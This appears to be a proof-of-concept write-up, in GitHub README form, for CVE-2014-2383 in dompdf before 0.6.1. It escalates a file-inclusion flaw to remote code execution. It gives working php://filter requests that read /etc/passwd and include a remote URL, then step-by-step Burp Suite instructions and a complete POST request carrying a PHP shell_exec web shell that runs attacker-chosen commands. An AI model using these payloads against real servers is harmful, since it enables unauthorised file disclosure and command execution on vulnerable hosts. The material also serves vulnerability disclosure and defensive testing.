# CVE-2014-2383 LFI/RFI escalation to RCE
Testing environment: dompdf 0.6.0 - php 7.3.33 - apache 2.4.25

During a security assessment the presence of CVE-2014-2383 was discovered. This document is a proof of concept and does not include the details from the initial discovery in order to protect client privacy. The conent in this document does however mimic the environment in which this vulnerability was exploited. 

Discovery
https://github.com/projectdiscovery/nuclei

![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221083357.png?raw=true)

Details of CVE-2014-2383
```
A vulnerability in dompdf.php in dompdf before 0.6.1, when DOMPDF_ENABLE_PHP is enabled, allows context-dependent attackers to bypass chroot protections and read arbitrary files via a PHP protocol and wrappers in the input_file parameter, as demonstrated by a php://filter/read=convert.base64-encode/resource in the input_file parameter.
```

Observe the ``php://filter/resource`` PHP wrapper being used to include the /etc/passwd file from the target. 
```http
{{BaseURL}}/dompdf.php?input_file=php://filter/resource=/etc/passwd
```
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221220074517.png?raw=true)

Not only did this PHP wrapper allow for local file inclusions but remote files as well. 

```http
{{BaseURL}}/dompdf.php?input_file=php://filter/resource=http://relativ3pa1n.com
```

![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221220074830.png?raw=true)
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221081319.png?raw=true)


#### Escalation to RCE

Up till this point we have been using known information and proof of concepts to exploit these vulnerabilities. In an attempt to further exploitation of this vulnerability I used other protocols and php filters in order to get some kind of "preprocessing" before the creation of the PDF. 

A key distinction in this LFI/RFI vulnerability was that any file being referenced in the LFI was being rendered as a PDF document. This would mean that attempting to render a PHP file through the LFI would only convert that file to a pdf and not execute the PHP in the file. Looking closer at our payload we will observe that the ``php://filter/resource=`` is the part of our payload that is bypassing a restriction put in place by DOMPDF. 

Using a different PHP filter we are able to have the server pre-process a POST request before executing the LFI. We can use the ``php://input`` input stream to read the raw data from our POST request. In addition, we can add a parameter with the command we want to execute and define it in our POST data. So our new parameter would look something like this ``php://input&cmd=id`` and our POST data would look like, ``<?php echo shell_exec($_GET[‘cmd’]);?>`` . The result of this is below.

#### Reproduction steps

Browse to the LFI once you have discovered a version of DOMPDF < 0.6.1
```http
{{BaseURL}}/dompdf.php?input_file=php://filter/resource=/etc/passwd
```

Capture this request in a proxy like BurpSuite
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221095422.png?raw=true)

Send the request to Repeater(ctrl+r)
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221095441.png?raw=true)

Once you have the request in Repeater right click the request and "Change Request Method"
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221095821.png?raw=true)

modify the ``input_file`` parameter:
```
From:
php://filter/resource=/etc/passwd
To:
php://input&cmd=whoami
```
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221111344.png?raw=true)


Add this to the body of the POST request: (Sometimes the single quotes need to be retyped)
```
<?php echo shell_exec($_GET['cmd']);?>
```
![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221111417.png?raw=true)

The entire Request should look close to something like this:
```
POST /dompdf/dompdf.php?input_file=php://input&cmd=whoami HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=3369f6e27b5a514fb12c7bac74f8b11e
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

<?php echo shell_exec($_GET['cmd']);?>
```

If you are using BurpSuite send the request and then use the search bar to search for "BT".
Observe the command has executed and the response is being written into the byte level data of the PDF attempting to be generated. (In this case the user is "daemon")

![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221100439.png?raw=true)

I have put together a python script that can automate most of this. 

![](https://github.com/Relativ3Pa1n/CVE-2014-2383-LFI-to-RCE-Escalation/blob/main/Pastedimage20221221110358.png?raw=true)

Disclamer: This is for educational purposes only. Please leave other peoples web servers alone. :smile:

Here is the link to the unlisted vid of the RCE. [Video](https://youtu.be/4ZVBUxVyJVU "https://youtu.be/4ZVBUxVyJVU")
